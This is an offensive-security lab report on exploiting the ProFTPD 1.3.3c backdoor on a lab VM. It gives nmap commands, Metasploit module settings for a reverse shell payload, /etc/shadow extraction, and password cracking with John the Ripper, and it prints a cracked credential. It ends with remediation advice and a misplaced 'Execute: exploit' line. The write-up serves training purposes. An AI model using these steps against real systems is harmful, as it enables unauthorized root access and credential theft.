 Offensive security Lab 
: ProFTPD 1.3.3c Backdoor Exploit (Root Flag)

1. Introduction and Objectives

This report details the penetration test performed on a vulnerable Linux virtual machine (VM), focusing on identifying a high-risk service vulnerability that allowed for immediate root access.

| Detail | Value |
| :--- | :--- |
| Target IP Address | [ 192.168.222.130] |
| Attacker IP Address (LHOST) | [ 192.168.222.128]|
| Target OS | Ubuntu 4ubuntu2.2 (Linux Kernel 3.x) |
| Objective| Gain a Root-level shell and retrieve the flag file. |

2. Initial Enumeration and Vulnerability Identification

The initial reconnaissance involved a service scan using Nmap to identify open ports and service versions.

Command:
```bash
sudo nmap -sS -sV 192.168.222.130
Key Findings:
 | Port | Service | Version | Risk | | :--- | :--- | :--- | :---
 | 21/tcp | ftp | ProFTPD 1.3.3c | CRITICAL (Exploitable Backdoor) |
 | 22/tcp | ssh | OpenSSH 7.2p2 | Low (Standard service) |
 | 80/tcp | http | Apache httpd 2.4.18 | Low (No obvious web vulnerability found) |

A subsequent vulnerability script scan confirmed the existence of a highly critical backdoor within the FTP service.
The Nmap script output explicitly showed command execution as the root user:

| ftp-proftpd-backdoor: 
|   This installation has been backdoored.
|   Command: id
|_  Results: uid=0(root) gid=0(root) groups=0(root)...

3. Exploitation and Root Shell Acquisition
The Metasploit Framework was used to leverage the confirmed ProFTPD backdoor.

Exploit Steps:
Launch Metasploit: msfconsole

Select Exploit Module: use exploit/unix/ftp/proftpd_133c_backdoor

Set Options:

Bash

set RHOSTS 192.168.222.130
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.222.128

Result: A command shell session was successfully established, granting immediate root privileges (uid=0).

4. Post-Exploitation and Flag Retrieval
Credential Harvesting
The system's user hashes were extracted from /etc/shadow for post-exploitation analysis. The hash for the user marlinspike was successfully cracked using John the Ripper.

Command Used (on Attacker Machine):

Bash

john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
Cracked Credential:

User: marlinspike

Password: marlinspike

5. Remediation Recommendations
The system's security posture is extremely weak due to the compromised FTP service. Immediate steps must be taken to secure the system:

Immediate Patch/Upgrade: The ProFTPD service must be immediately patched or upgraded to a secure version (greater than 1.3.3g) to fix the known backdoor and related CVEs.

Service Removal: If FTP is not required for the system's function, the service should be completely removed.

Firewalling: Implement strict firewall rules (iptables/ufw) to block external access to Port 21.

Secure Shell Configurations: Review SSH configurations to disable root login and enforce key-based authentication.
Execute: exploit
